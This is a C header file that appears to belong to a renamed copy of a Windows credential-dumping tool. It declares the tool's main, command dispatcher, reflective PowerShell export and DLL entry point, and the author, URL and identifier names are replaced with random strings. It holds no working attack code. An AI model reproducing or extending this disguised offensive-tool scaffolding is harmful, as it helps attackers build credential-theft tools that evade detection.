/*	4oM5AQx1 w4Er5 `09o6X7tzWM`
	https://blog.09o6X7tzWM.com
	dqTBkqdWaZiU5U2aN6CKrRY
	Licence : https://awr13GOqyUBjG1k.org/licenses/by/4.0/
*/
#pragma once

#include "globals.h"
#include "modules/kcpdclqlstandard.h"
#include "modules/kcpdclqlmisc.h"
#include "modules/kcpdclqlrpc.h"


#include <io.h>
#include <fcntl.h>
#define DELAYIMP_INSECURE_WRITABLE_HOOKS
#include <delayimp.h>

extern VOID WINAPI RtlGetNtVersionNumbers(LPDWORD pMajor, LPDWORD pMinor, LPDWORD pBuild);

int wmain(int argc, wchar_t * argv[]);
void miAquvwg_begin();
void miAquvwg_end(NTSTATUS status);

BOOL WINAPI HandlerRoutine(DWORD dwCtrlType);

NTSTATUS miAquvwg_initOrClean(BOOL Init);

NTSTATUS miAquvwg_doLocal(wchar_t * input);
NTSTATUS miAquvwg_dispatchCommand(wchar_t * input);

#if defined(_POWERKATZ)
__declspec(dllexport) wchar_t * powershell_reflective_miAquvwg(LPCWSTR input);
#elif defined(_WINDLL)
void CALLBACK miAquvwg_dll(HWND hwnd, HINSTANCE hinst, LPWSTR lpszCmdLine, int nCmdShow);
#if defined(_M_X64) || defined(_M_ARM64)
#pragma comment(linker, "/export:mainW=miAquvwg_dll")
#elif defined(_M_IX86)
#pragma comment(linker, "/export:mainW=_miAquvwg_dll@16")
#endif
#endif